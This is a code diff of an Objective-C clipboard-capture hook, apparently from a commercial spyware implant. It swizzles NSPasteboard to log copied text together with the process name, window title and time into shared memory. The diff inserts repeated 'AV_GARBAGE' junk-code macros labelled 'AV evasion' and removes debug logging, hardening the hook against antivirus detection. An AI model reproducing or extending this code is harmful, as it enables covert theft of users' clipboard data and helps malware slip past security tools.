@@ -12,18 +12,24 @@
 #import "RCSMInputManager.h"
 #import "RCSMCommon.h"
 
+#import "RCSMAVGarbage.h"
+
 //#define DEBUG
 
 @implementation NSPasteboard (clipboardHook)
 
 - (BOOL)setDataHook:(NSData *)data forType:(NSString *)dataType
-{
+{    
+  // AV evasion: only on release build
+  AV_GARBAGE_007
+  
   NSString      *_windowName;
   NSMutableData *processName;
   NSMutableData *windowName;
   short unicodeNullTerminator = 0x0000;
-
-  int a = 0;
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
   
 #ifdef DEBUG
   NSLog(@"setDataHook: logging clipboard for dataType [%@]", dataType);
@@ -31,7 +37,8 @@
 
   BOOL bRet = [self setDataHook: data forType: dataType];
   
-  a++;
+  // AV evasion: only on release build
+  AV_GARBAGE_003
   
   // Take text only
   if ([dataType compare: NSStringPboardType] == NSOrderedSame)
@@ -44,11 +51,17 @@
                                           NSUTF16LittleEndianStringEncoding
                                                   allowLossyConversion: true]];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       NSMutableData   *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
       NSMutableData *entryData = [[NSMutableData alloc] init];
       
       NSProcessInfo *processInfo  = [NSProcessInfo processInfo];
       NSString *_processName      = [[processInfo processName] copy];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_002
       
       time_t rawtime;
       struct tm *tmTemp;
@@ -56,14 +69,18 @@
       processName  = [[NSMutableData alloc] initWithData:
                       [_processName dataUsingEncoding:
                        NSUTF16LittleEndianStringEncoding]];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
+      
       // Struct tm
       time (&rawtime);
       tmTemp = gmtime(&rawtime);
       tmTemp->tm_year += 1900;
       tmTemp->tm_mon  ++;
-      
-      a++;
+    
+      // AV evasion: only on release build
+      AV_GARBAGE_001
       
       if (sizeof(long) == 4) // 32bit
         {
@@ -76,15 +93,17 @@
                           length: sizeof (struct tm) - 0x14];
         }
       
+      // AV evasion: only on release build
+      AV_GARBAGE_005
+      
       // Process Name
       [entryData appendData: processName];
       // Null terminator
       [entryData appendBytes: &unicodeNullTerminator
                       length: sizeof(short)];
-    
-#ifdef DEBUG
-      NSLog(@"setDataHook: process name [%@]", processName);
-#endif    
+          
+      // AV evasion: only on release build
+      AV_GARBAGE_006
     
       // Window Name
       _windowName = [[[[NSApplication sharedApplication] mainWindow] title] copy];
@@ -95,33 +114,47 @@
       windowName = [[NSMutableData alloc] initWithData:
                     [_windowName dataUsingEncoding:
                      NSUTF16LittleEndianStringEncoding]];
-    
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_009
+      
       [entryData appendData: windowName];
     
       // Null terminator
       [entryData appendBytes: &unicodeNullTerminator
                       length: sizeof(short)];
       
-#ifdef DEBUG
-      NSLog(@"setDataHook: window name [%@]", windowName);
-#endif
-    
+      // AV evasion: only on release build
+      AV_GARBAGE_000
+      
       // Clipboard
       [entryData appendData: clipboardContent];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_001
       
       // Null terminator
       [entryData appendBytes: &unicodeNullTerminator
                       length: sizeof(short)];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_007
       
       // Delimiter
       uint32_t del = LOG_DELIMITER;
       [entryData appendBytes: &del
                       length: sizeof(del)];
       
+      // AV evasion: only on release build
+      AV_GARBAGE_004
+      
       [_windowName release];
       [processName release];
       [windowName release];
       [clipboardContent release];
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_000
       
       shMemoryLog *shMemoryHeader     = (shMemoryLog *)[logData bytes];
       shMemoryHeader->status          = SHMEM_WRITTEN;
@@ -134,6 +167,9 @@
       memcpy(shMemoryHeader->commandData,
              [entryData bytes],
              [entryData length]);
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
       
       if ([mSharedMemoryLogging writeMemory: logData
                                      offset: 0
@@ -154,7 +190,8 @@
       [logData release];
     }
   
-  a--;
+  // AV evasion: only on release build
+  AV_GARBAGE_007
   
   return bRet;
 }
